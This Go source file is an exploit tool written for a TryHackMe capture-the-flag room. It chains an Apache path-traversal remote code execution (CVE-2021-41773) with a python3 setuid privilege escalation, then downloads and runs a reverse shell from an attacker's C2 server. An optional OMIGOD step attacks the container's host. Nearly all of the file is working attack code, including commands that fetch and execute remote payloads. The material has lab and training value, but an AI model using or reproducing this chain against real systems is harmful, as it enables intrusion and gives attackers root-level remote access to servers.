//================================================================================
//
// Script Name: stage1.go
//
// Author: Thomas Osgood
//
// Description:
//
// 		This script gains root access to the docker container running the webpage
//		for the OhMyWebserver machine on TryHackMe.com. The script exploits an
//		Apache CVE to upload a privilege escalation script via remote code
//		execution and gain a reverse shell as root on the target container. This
//		the first phase of the TryHackMe room. Once this exploit has been run and
//		the attacker has root access to the cointainer, they are able to extract
// 		the user flag.
//
//		Optionally, this script exploits the OMI vulnerability present in the
//		system to upload and execute a reverse shell on the host machine. This
//		allows the attacker access to the root flag.
//
//		Note:
//		If the attacker chooses to include the execution of the omigod exploit,
//		they must also have an omi.py file served alongside the shell binary.
//		One such omi.py exploit script can be found here:
//			https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py
//
//		To run this exploit with OMI, use the flag "-o"
//
//================================================================================
//
// Build Command:
//
//		go build stage1.go
//
//================================================================================
//
// Example Execution:
//
//		./stage1 -i <targetIp> -c <c2IP>:<c2Port> -s <shellBinary>
//
//================================================================================
package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

var EXPLOIT_BIN string
var SHELL_BIN string

var OMIGOD bool = true

//================================================================================
//								Output Functions
//================================================================================

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func PrintChar(c string) {
	for i := 0; i < 40; i++ {
		fmt.Printf("%s", c)
	}
	fmt.Printf("\n")
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

//================================================================================
//
// Function Name: CreateExploit
//
// Author: Thomas Osgood
//
// Description:
//
// 		This function creates an exploit script that will be uploaded to the
// 		target. This script elevates the user privilege by exploiting a
//		capability granted to python3 on the target machine. By setting the uid,
//		the python3 script is able to execute commands as the root user. The
//		script generated pulls down a shell file from the C2 server and runs it.
//		This shell is run in the background as the OMI exploit is run to gain
//		a shell on the host (non-docker) machine.
//
//		When the execution of this script is complete, the attacker will have
//		two shells: one for the docker container, and one for the host.
//
// Input(s):
//
//		c2IP - ip address of C2 server. port must be included as well. (ip:port)
//
// Return(s):
//
//		success - bool. indication of successful execution.
//		message - string. status message.
//
//================================================================================
func CreateExploit(c2IP string) (success bool, message string) {
	var exploitBody string
	var getOMI string
	var pythonCmd string
	var runOMI string

	// Python to pull down reverse shell.
	getReverseShell := fmt.Sprintf("r=requests.get('http://%s/%s');f=open('/tmp/shell','wb');f.write(r.content);f.close()", c2IP, SHELL_BIN)

	// Python to pull down OMI exploit.
	if OMIGOD {
		getOMI = fmt.Sprintf("r=requests.get('http://%s/omi.py');f=open('/tmp/omi','wb');f.write(r.content);f.close()", c2IP)
	} else {
		getOMI = ""
	}
	// Python command to execute as root.
	pythonCmd = fmt.Sprintf(
		"import requests;%s;%s",
		getReverseShell,
		getOMI,
	)

	// Create reverse shell on docker container.
	getBackdoor := "chmod +x /tmp/shell;python3 -c \"import subprocess;subprocess.Popen(['/tmp/shell'])\""

	// Gain reverse shell on host machine.
	if OMIGOD {
		runOMI = fmt.Sprintf("python3 /tmp/omi -t 172.17.0.1 -c \"curl -o /tmp/shell http://%s/%s; chmod +x /tmp/shell;/tmp/shell\";", c2IP, SHELL_BIN)
	} else {
		runOMI = ""
	}

	// Python script to elevate privilege and execute command above.
	exploitBody = "#!/usr/bin/env python3\nimport os\nos.setuid(0)\nos.system(\"\"\"python3 -c \"%s\";%s;%s\"\"\")"
	exploitBody = fmt.Sprintf(exploitBody, pythonCmd, getBackdoor, runOMI)

	// Create file on local machine.
	fptr, err := os.Create("exploit")
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	// Write data to file.
	_, err = fptr.Write([]byte(exploitBody))
	if err != nil {
		return false, err.Error()
	}

	return true, "Exploit script created successfully."
}

//================================================================================
//
// Function Name: UploadExploit
//
// Author: Thomas Osgood
//
// Description:
//
// 		This function uploads the exploit script to the target machine by
//		exploiting a vulnerability (CVE-2021-41773) in Apache that allows RCE.
//
// Input(s):
//
//		targetIP - string. ip address of target.
//		c2IP - string. ip address of C2 server. port must be included as well.
//
// Return(s):
//
//		success - bool. indication of successful execution.
//		message - string. status message.
//
//================================================================================
func UploadExploit(targetIP string, c2IP string) (success bool, message string) {
	var body string
	var cmd string
	var location string
	var respBody []byte
	var pyCmd string
	var targetFormat string = "http://%s/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e%s"
	var targetURL string

	// Create exploit to be sent in body of HTTP request.
	pyCmd = fmt.Sprintf("import requests;r=requests.get('http://%s/%s');fptr=open('/tmp/exploit','wb');fptr.write(r.content);fptr.close()", c2IP, EXPLOIT_BIN)
	cmd = fmt.Sprintf("python3 -c \"%s\";chmod +x /tmp/exploit;/tmp/exploit", pyCmd)
	body = fmt.Sprintf("echo Content-Type: text/plain; echo; %s", cmd)

	// Setup vulnerable URL.
	location = "/bin/sh"
	targetURL = fmt.Sprintf(targetFormat, targetIP, location)

	InfMsgNB("Creating HTTP client.")
	client := http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", targetURL, bytes.NewBuffer([]byte(body)))
	if err != nil {
		return false, err.Error()
	}

	InfMsgNB("Making request.")
	resp, err := client.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	InfMsgNB("Reading response.")
	respBody, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		// If there is a timeout, the shell has execute successfully.
		if e, ok := err.(net.Error); ok && e.Timeout() {
			return true, "Shell execution successful."
		}
		// Any other error is bad.
		return false, err.Error()
	}

	// Shell command returned an error code.
	if len(respBody) < 1 {
		return false, "Failed to successfully execute command."
	}

	// Non-shell success message.
	SysMsg(strings.Replace(string(respBody), "\n", "", -1))
	return true, "Exploit uploaded successfully."
}

func main() {
	var c2IP string
	var message string
	var success bool
	var targetIP string

	// Setup command-line arguments.
	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address.")
	flag.StringVar(&c2IP, "c", "127.0.0.1", "C2 IP address.")
	flag.StringVar(&EXPLOIT_BIN, "e", "exploit", "exploit binary name.")
	flag.StringVar(&SHELL_BIN, "s", "shell", "shell binary name.")
	flag.BoolVar(&OMIGOD, "o", false, "pull down omi.py and run omigod attack.")
	flag.Parse()

	PrintChar("=")
	InfMsg(fmt.Sprintf("Target: %s", targetIP))
	InfMsg(fmt.Sprintf("C2 IP: %s", c2IP))
	InfMsg(fmt.Sprintf("Exploit Binary: %s", EXPLOIT_BIN))
	InfMsg(fmt.Sprintf("Shell Binary: %s", SHELL_BIN))
	PrintChar("=")

	success, message = CreateExploit(c2IP)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = UploadExploit(targetIP, c2IP)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

